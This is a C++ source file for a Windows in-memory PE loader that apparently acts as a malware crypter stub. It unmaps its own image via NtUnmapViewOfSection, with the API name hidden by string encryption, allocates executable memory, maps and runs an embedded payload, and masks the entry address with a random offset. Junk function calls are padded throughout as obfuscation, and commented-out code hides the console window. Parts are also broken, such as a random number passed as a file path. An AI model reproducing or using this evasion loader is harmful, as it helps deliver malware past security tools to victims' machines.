#include "stdafx.h"
#include <Windows.h>
#include "peBase.hpp"
#include "fixIAT.hpp"
#include "fixReloc.hpp"
#include <locale>
#include <codecvt>
#include <thread>
using namespace std;	
HMODULE dll = LoadLibraryA("ntdll.dll");
size_t retAddr;
uint64_t rna;
bool peLoader(int exePath)
{
	LONGLONG fileSize = -1;
	BYTE *data = MapFileToMemory(exePath, fileSize);
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	BYTE* pImageBase = NULL;
	LPVOID preferAddr = 0;
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	IMAGE_NT_HEADERS *ntHeader = (IMAGE_NT_HEADERS *)getNtHdrs(data);

	if (!ntHeader) 
	{
		return false;
	}

 	IMAGE_DATA_DIRECTORY* relocDir = getPeDir(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);

	preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
	auto s = skCrypt("NtUnmapViewOfSection");
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, s))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);
	s.clear();

	pImageBase = (BYTE *)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pImageBase && !relocDir)
	{
		return false;
	}
	if (!pImageBase && relocDir)
	{
		pImageBase = (BYTE *)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (!pImageBase)
		{
			return false;
		}
	}
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;
	memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	IMAGE_SECTION_HEADER * SectionHeaderArr = (IMAGE_SECTION_HEADER *)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{
		memcpy
		(
			LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress),
			LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData),
			SectionHeaderArr[i].SizeOfRawData
		);
	}
	fixIAT(pImageBase);
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
	rna = rand();
	retAddr = retAddr + rna;
	ZeroMemory(data, sizeof(data));
	ZeroMemory(a, sizeof(a)); 
}
void calc() {
	while (true) {
		Sleep(3000);
		oufnbri::oufnbri();
		karpxjj::karpxjj();
		nqydloa::nqydloa();
		oqujoyj::oqujoyj();
	}
}
bool True1(){
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	int a = rand();
	int tmp = a;
	if (a = tmp);
	return true;
}
void clear() {
	Sleep(1000);
	retAddr = 0;
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	thread thread2 = thread(calc);
	thread2.detach();
}
void cfs() {
	msxtawr::msxtawr();
	zrvalpp::zrvalpp();
	vuhcgzh::vuhcgzh();
	oufnbri::oufnbri();
	karpxjj::karpxjj();
	nqydloa::nqydloa();
	oqujoyj::oqujoyj();
	thread thread1 = thread(clear);
	thread1.detach();
	((void(*)())(retAddr-rna))();
}
void main()
{
	bool doit = true;
	/*std::ofstream file;
	encrypt(a);
	file.open("myfile.txt", std::ios_base::binary);
	for (int i = 0; i < sizeof(a) / sizeof(a[0]); ++i)
	file.write((char*)(a + i * sizeof(a[0])), sizeof(a[0]));
	HWND hConsole = GetConsoleWindow();
	ShowWindow(hConsole, SW_HIDE);*/
	for (int i = 0; i < 3; i++) {
		Sleep(1000);
		int a = rand();
		if (doit) {
			peLoader(rand());
			doit = false;
		}
		msxtawr::msxtawr();
		zrvalpp::zrvalpp();
		vuhcgzh::vuhcgzh();
		oufnbri::oufnbri();
		karpxjj::karpxjj();
		nqydloa::nqydloa();
		oqujoyj::oqujoyj();
		if (i > 1) {
			//peLoader(rand());
			msxtawr::msxtawr();
			zrvalpp::zrvalpp();
			vuhcgzh::vuhcgzh();
			oufnbri::oufnbri();
			karpxjj::karpxjj();
			nqydloa::nqydloa();
			oqujoyj::oqujoyj();
			if (True1() == true) {
				msxtawr::msxtawr();
				zrvalpp::zrvalpp();
				vuhcgzh::vuhcgzh();
				oufnbri::oufnbri();
				karpxjj::karpxjj();
				nqydloa::nqydloa();
				oqujoyj::oqujoyj();
				cfs();
				msxtawr::msxtawr();
				zrvalpp::zrvalpp();
				vuhcgzh::vuhcgzh();
				oufnbri::oufnbri();
				karpxjj::karpxjj();
				nqydloa::nqydloa();
				oqujoyj::oqujoyj();
			}
		}
	}
}

